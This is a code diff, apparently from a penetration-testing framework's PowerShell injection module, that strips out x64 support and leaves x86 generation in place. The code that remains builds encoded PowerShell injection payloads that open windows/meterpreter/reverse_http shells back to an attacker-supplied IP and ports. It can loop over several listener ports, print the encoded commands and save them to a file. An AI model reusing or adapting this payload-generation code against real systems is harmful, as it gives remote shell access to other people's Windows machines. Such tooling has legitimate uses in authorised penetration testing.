@@ -26,12 +26,10 @@ else:
 multi_injection = check_config("POWERSHELL_MULTI_INJECTION=").lower()
 
 # check what payloads we are using
-powershell_inject_x64 = check_config("POWERSHELL_INJECT_PAYLOAD_X64=")
 powershell_inject_x86 = check_config("POWERSHELL_INJECT_PAYLOAD_X86=")
 
 # if we specified a hostname then default to reverse https/http
 if validate_ip(ipaddr) == False:
-    powershell_inject_x64 = "windows/meterpreter/reverse_https"
     powershell_inject_x86 = "windows/meterpreter/reverse_http"
 
 # prompt what port to listen on for powershell then make an append to the current
@@ -73,12 +71,10 @@ if multi_injection == "on":
     print_status("Multi-Powershell-Injection is set to ON, this should be sweet...")
 
 # define a base variable
-x64 = ""
 x86 = ""
 
 # specify a list we will use for later
 multi_injection_x86 = ""
-multi_injection_x64 = ""
 
 # here we do some funky loops so we don't need to rewrite the code below
 if multi_injection == "on":
@@ -90,8 +86,6 @@ if multi_injection == "on":
     for ports in port:
         # dont cycle through if theres a blank
         if ports != "":
-            print_status("Generating x64-based powershell injection code for port: %s" % (ports))
-            multi_injection_x64 = multi_injection_x64 + "," + generate_powershell_alphanumeric_payload(powershell_inject_x64, ipaddr, ports, x64)
             print_status("Generating x86-based powershell injection code for port: %s" % (ports))
             multi_injection_x86 = multi_injection_x86 + "," +  generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, ports, x86)
 
@@ -123,29 +117,20 @@ if multi_injection == "on":
 
 # if its turned to off
 if multi_injection == "off":
-    print_status("Generating x64-based powershell injection code...")
-    x64 = generate_powershell_alphanumeric_payload(powershell_inject_x64, ipaddr, port, x64)
     print_status("Generating x86-based powershell injection code...")
     x86 = generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, port, x86)
 
 # if we are specifying multi powershell injection
 if multi_injection == "on":
-    x64 = multi_injection_x64[1:] # remove comma at beginning
     x86 = multi_injection_x86[1:] # remove comma at beginning
 
 # check to see if we want to display the powershell command to the user
 verbose = check_config("POWERSHELL_VERBOSE=")
 if verbose.lower() == "on":
-    print_status("Printing the x64 based encoded code...")
-    time.sleep(3)
-    print x64
     print_status("Printing the x86 based encoded code...")
     time.sleep(3)
     print x86
 
-filewrite = file("%s/x64.powershell" % (setdir), "w")
-filewrite.write(x64)
-filewrite.close()
 filewrite = file("%s/x86.powershell" % (setdir), "w")
 filewrite.write(x86)
 filewrite.close()
